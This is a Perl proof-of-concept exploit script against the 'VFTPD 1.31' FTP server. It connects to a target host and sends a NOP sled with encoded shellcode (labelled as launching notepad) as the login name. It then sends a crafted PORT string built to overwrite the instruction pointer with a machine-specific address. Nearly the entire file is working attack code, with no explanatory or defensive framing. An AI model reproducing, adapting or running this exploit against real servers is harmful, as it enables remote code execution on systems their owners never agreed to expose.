#!/usr/bin/perl

use Net::FTP;
$host = @ARGV[0];

if ($host)
{
   print "\n- VFTPD 1.31 - PoC (code excution machine specific Exploit\n-
					X4lt\n";
   $ftp = Net::FTP->new($host, Debug => 0);

#ok so now off 2 build the address
#so as title stated its machine specific atm
#

$var1 = "92000000,"x46;
$var2 = "92000000,";
										 #0047366C => This will become EIP (Machine specific)
$var3 = "92060012,"; #      6C
$var4 = "92030006,"; #    36
$var5 = "92040007,"; #  47
$var6 = "92000000,"; #00
$var7 = "2";

$buff = $var1.$var2.$var3.$var4.$var5.$var6.$var7;

$np = "\x90" x 200;
#notepad
$sc = "\xda\xde\xb8\xb8\x7f\xc3\xb5\x31\xc9\xb1\x33\xd9\x74\x24" .
"\xf4\x5b\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\x4d\x83" .
"\x2b\x3c\xad\x7c\xac\x5f\x24\x99\x9d\x4d\x52\xe9\x8c\x41" .
"\x11\xbf\x3c\x29\x77\x54\xb6\x5f\x5f\x5b\x7f\xd5\xb9\x52" .
"\x80\xdb\x05\x38\x42\x7d\xf9\x43\x97\x5d\xc0\x8b\xea\x9c" .
"\x05\xf1\x05\xcc\xde\x7d\xb7\xe1\x6b\xc3\x04\x03\xbb\x4f" .
"\x34\x7b\xbe\x90\xc1\x31\xc1\xc0\x7a\x4d\x89\xf8\xf1\x09" .
"\x29\xf8\xd6\x49\x15\xb3\x53\xb9\xee\x42\xb2\xf3\x0f\x75" .
"\xfa\x58\x2e\xb9\xf7\xa1\x77\x7e\xe8\xd7\x83\x7c\x95\xef" .
"\x50\xfe\x41\x65\x44\x58\x01\xdd\xac\x58\xc6\xb8\x27\x56" .
"\xa3\xcf\x6f\x7b\x32\x03\x04\x87\xbf\xa2\xca\x01\xfb\x80" .
"\xce\x4a\x5f\xa8\x57\x37\x0e\xd5\x87\x9f\xef\x73\xcc\x32" .
"\xfb\x02\x8f\x58\xfa\x87\xaa\x24\xfc\x97\xb4\x06\x95\xa6" .
"\x3f\xc9\xe2\x36\xea\xad\x13\xc6\x26\x38\x83\x71\xd3\x01" .
"\xc9\x81\x0e\x45\xf4\x01\xba\x36\x03\x19\xcf\x33\x4f\x9d" .
"\x3c\x4e\xc0\x48\x42\xfd\xe1\x58\x2c\x6e\x6a\x06\xc0\x11" .
"\xf6\xe6\x45\xaa\x93\xf6";

$np2 = "\x90" x 30;
$sc = $np.$sc.$np2;
$ftp->login($sc,'');
sleep(2);
$ftp->port($buff);

}
else {
   print "\n- VFPTD 1.31 - PoC Exploit\n-
X4lt\n\n- Usage: $0 host\n";
}